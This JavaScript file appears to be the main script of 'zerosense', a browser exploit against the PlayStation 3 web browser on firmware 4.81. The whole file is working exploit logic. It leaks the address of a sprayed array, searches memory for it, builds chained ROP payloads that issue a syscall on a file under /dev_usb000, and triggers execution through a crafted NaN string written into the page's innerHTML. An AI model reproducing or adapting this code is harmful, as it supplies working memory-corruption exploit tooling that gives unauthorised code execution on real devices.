/*eslint-disable no-unused-vars */

///////////////////////////////////////

var ArrayLeaker = require('zerosense/ArrayLeaker');
var ChainBuilder = require('zerosense/ChainBuilder');
var Logger = require('zerosense/Logger');
var MemoryReader = require('zerosense/MemoryReader');
var Searcher = require('zerosense/Searcher');
var OffsetsUtil = require('zerosense/OffsetsUtil');
var Util = require('zerosense/Util');

var logger = null;

var memoryReader = null;
var searcher = null;

(function() {
	try {
		var ua = navigator.userAgent;

		var environment = {};
		
		/*environment.ps3 = ua.indexOf("PLAYSTATION 3") !== -1;
		environment.firmware = environment.ps3 ? ua.substr(ua.indexOf("PLAYSTATION 3") + 14, 4)
				: "0.00";
		environment.dex = true;*/
		
		if (true) {
			environment.ps3 = true;
			environment.firmware = "4.81";
			environment.dex = true;
		}		

		var log = document.getElementById("log");
		if (log === null) {
			throw new Error("Log element not found.");
		}

		Logger.init(log);
		window.logger = logger = Logger.getLogger();
	} catch (e) {
		alert(e);
		console.error(e, e.name, e.stack);
		return;
	}

	try {
		logger.clear();

		if (environment.ps3) {
			logger.info(`Detected a PS3 on FW ${environment.firmware} ${environment.dex ? 'DEX' : 'CEX'}.`);
		} else {
			logger.info("No PS3 detected. May not work as expected.");
		}

		memoryReader = new MemoryReader();
		searcher = new Searcher(memoryReader);
		
		window.Offsets = OffsetsUtil.get(environment.dex, environment.firmware);

		////////////////////

		var buttonInit = document.getElementById("buttonInit");
		buttonInit.addEventListener("click", () => init());
		
		var buttonCreateChain = document.getElementById("buttonCreateChain");
		buttonCreateChain.addEventListener("click", () => createChain());
		
		var buttonExecuteChain = document.getElementById("buttonExecuteChain");
		buttonExecuteChain.addEventListener("click", () => executeChain());
		
		var buttonLogClear = document.getElementById("buttonLogClear");
		buttonLogClear.addEventListener("click", () => logger.clear());
		
		buttonInit.focus();
	} catch (e) {
		if (environment.ps3) {
			alert(e);
		}
		console.error(e, e.name, e.stack);
	}
})();

///////////////////////////////////////

var arrayLeaker = null;

function init(step = 0, data = null) {
	if (step === 0) {
		logger.info("Initializing...");
		step++;
	}
	
	if (step === 1) {
		arrayLeaker = new ArrayLeaker(memoryReader);
		arrayLeaker.createArray(11, "c0ffee33");
		
		var searchStart = 0x80190000;
		var searchEnd = 0x80600000;
		searcher.startArray(searchStart, searchEnd - searchStart, arrayLeaker.getArray(), (data) => init(step + 1, data));
	}
	
	if (step === 2) {
		if (data.match === null) {
			logger.error("Failed to find ArrayLeaker array.");
			return;
		}
		
		logger.info(`Found leakArray at 0x${data.match.toString(16)}`);
		arrayLeaker.setAddress(data.match);
		step++;
	}
	
	if (step === 3) {
		logger.info("Initialized.");
	}
}

var addrChainStart = null;

function createChain() {
	logger.info("Creating chain...");
	
	addrChainStart = null;
	
	// TOOD: Be able to pass string and not have it be a wchar
	var file = "/dev_usb000/zerosense";
	arrayLeaker.setString(3, file);
	var addrFile = arrayLeaker.getStringAddress(3);
	if (addrFile === null) {
		logger.error("Failed to get file address.");
		return;
	}
	logger.info(`Found file at 0x${addrFile.toString(16)}`);
	
	//var chain2 = new ChainBuilder().syscall(0x188, 0x1004, 0xA, 0x1B6, 0, 0, 0, 0, 0).create();
	var chain2 = new ChainBuilder().syscall(811, addrFile, 0o700, 0, 0, 0, 0, 0, 0).create();
	logger.info(Util.str2hex(chain2));
	arrayLeaker.setString(2, chain2);
	var addrChain2 = arrayLeaker.getStringAddress(2);
	if (addrChain2 === null) {
		logger.error("Failed to get chain2 address.");
		return;
	}
	logger.info(`Found chain2 at 0x${addrChain2.toString(16)}`);
	
	var chain1 = ChainBuilder.setup2(addrChain2 + 4);
	arrayLeaker.setString(1, chain1);
	var addrChain1 = arrayLeaker.getStringAddress(1);
	if (addrChain1 === null) {
		logger.error("Failed to get chain1 address.");
		return;
	}
	logger.info(`Found chain1 at 0x${addrChain1.toString(16)}`);
	
	var chain0 = ChainBuilder.setup1(addrChain1 + 4);
	arrayLeaker.setString(0, chain0);
	var addrChain0 = arrayLeaker.getStringAddress(0);
	if (addrChain0 === null) {
		logger.error("Failed to get addrChain0 address.");
		return;
	}
	logger.info(`Found chain0 at 0x${addrChain0.toString(16)}`);
	
	addrChainStart = addrChain0 + 4;
	
	logger.info(`Chain start at 0x${addrChainStart.toString(16)}`);
	
	logger.info("Created chain.");
}

function execute(addressChainStart, callback) {
	setTimeout(() => {
		logger.info(`Starting chain at 0x${addressChainStart.toString(16)}`);
		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + addressChainStart.toString(16) + ")");
		callback();
	}, 1);
}

function executeChain() {
	logger.info("Execute chain...");
	
	if (addrChainStart === null) {
		logger.error("addrChainStart is null.");
		return;
	}
	
	execute(addrChainStart, () => {
		window.logger.info("Executed chain.");
	});
}

///////////////////////////////////////

